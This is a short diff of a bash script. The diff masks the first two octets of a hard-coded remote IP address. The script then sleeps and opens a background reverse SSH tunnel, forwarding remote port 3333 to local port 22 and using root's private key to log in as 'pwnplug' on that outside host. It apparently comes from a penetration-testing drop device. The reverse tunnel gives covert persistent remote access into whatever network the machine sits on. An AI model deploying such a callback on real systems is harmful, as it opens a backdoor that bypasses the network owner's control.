@@ -1,6 +1,6 @@
 #! /bin/bash
 #Remote IP Addr
-hostip=54.88.76.202
+hostip=xx.xx.76.202
 # Normal reverse SSH
 sleep 5 
 ssh -NR 3333:localhost:22 -i /root/.ssh/id_rsa pwnplug@"$hostip" -p 22 &
